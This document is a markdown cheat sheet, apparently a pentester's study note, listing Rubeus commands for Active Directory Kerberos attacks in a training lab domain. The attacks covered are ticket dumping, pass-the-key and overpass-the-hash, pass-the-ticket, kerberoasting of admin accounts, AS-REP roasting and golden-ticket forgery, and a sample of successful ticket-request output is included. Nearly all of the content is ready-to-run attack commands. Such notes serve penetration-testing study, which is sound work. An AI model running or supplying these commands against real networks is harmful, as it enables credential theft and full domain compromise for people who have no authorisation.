---
tags:
  - windows
  - kerberoasting
  - PtT
  - PtH
  - asrep-roasting
---
# Modules
## Dump Kerberos Ticket Data
```cmd-session
> Rubeus.exe dump /nowrap
```
`dump` to print the ticket in base64 (easy copy-paste)

# Pass the Key / OverPass the Hash
## Using AES Key
Use the module `asktgt` with username, domain, and hash (`/rc4`, `/aes128`, `/aes256`, or `/des`). The hash can be collected using [[Mimikatz]] `sekurlsa::ekeys`.
```cmd-session
> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES-KEY> /nowrap
```
## Using RC4 Hash
Instead of retrieving the ticket in base64, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.
```cmd-session
> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<RC4-HASH> /ptt
```
## Using PKI Certificate
```powershell-session
> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$'
[*] Using domain controller: 172.16.5.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
	doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
	QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC
    AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC
    ... SNIP ... 
    GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ
    TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  ACADEMY-EA-DC01$
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  3/30/2022 3:50:25 PM
  EndTime                  :  3/31/2022 1:50:25 AM
  RenewTill                :  4/6/2022 3:50:25 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==
  ASREP (key)              :  2A621F62C32241F38FA68826E95521DD
```
This ticket can be confirmed in memory using [[klist]]
## Alternate Methods
1. Using harvested keys in `.kirbi`
We can import the ticket (created using Mimikatz [[Mimikatz#Export Tickets|Export Tickets]] module) into the current session.
```cmd-session
> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
2. Pass base64 ticket
	- Convert `.kirbi` to Base64 Format
```powershell-session
PS > [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
Now we can pass this base64 instead of filename
```cmd-session
> Rubeus.exe ptt /ticket:<BASE64-TICKET>
```
>**Note:** Mimikatz requires administrative rights for Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

# Powershell Remoting with PtT
The option `createnetonly` creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)) which is hidden by default, but can be displayed using `/show` (equivalent of `runas /netonly`). This prevents the erasure of existing TGTs for the current logon session.
```cmd-session
> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
This should open a new CMD window from where we can execute Rubeus to request a new TGT, using `ptt`, to import the ticket into the current session and connect to the DC using PS Remoting.
```powershell
PS > Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES-KEY> /ptt
> powershell
PS > Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES-KEY> /ptt
```
# Kerberoasting
## Gather Stats
```powershell
PS > .\Rubeus.exe kerberoast /stats
```
## Retrieve TGS Tickets
- Request tickets of accounts with `admincount=1` (high value targets):
```powershell
PS > .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
- Request ticket for a specific user:
```powershell
PS > .\Rubeus.exe kerberoast /user:<USER> /nowrap
```
## Usefule Flags
- `/tgtdeleg`: Retrieve only `RC4` encrypted ticket (Does not work on Server 2019+)
# Retrieve AS-REP (ASREPRoasting)
```powershell
PS > .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
# Golden Ticket
The same steps can be followed like in [[Mimikatz#Golden Ticket|Mimikatz]] to obtain required information.
```powershell
PS >  .\Rubeus.exe golden /rc4:<NT-HASH> /domain:<CHILD-DOMAIN-FQDN> /sid:<CHILD-DOMAIN-SID>  /sids:<ROOT-DOMAIN-ENTERPRISE-ADMINS-GROUP-SID> /user:hacker /ptt
```
The ticket can be confirmed with [[klist]]. And if the attack is successful, we should be able to read DC's whole C drive!
```powershell
PS > ls \\academy-ea-dc01.inlanefreight.local\c$
```